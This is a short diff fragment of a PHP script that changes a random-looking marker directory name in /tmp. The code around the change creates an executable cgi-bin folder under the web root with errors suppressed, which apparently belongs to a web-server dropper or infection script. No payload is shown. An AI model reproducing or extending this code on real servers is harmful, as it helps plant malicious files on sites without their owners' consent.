@@ -7,8 +7,8 @@ die();  }
 
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
-if(file_exists('/tmp/dfgfdg444'.$d.$random)) { } else {
-	mkdir('/tmp/dfgfdg444'.$d.$random);
+if(file_exists('/tmp/54g445gg'.$d.$random)) { } else {
+	mkdir('/tmp/54g445gg'.$d.$random);
 	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
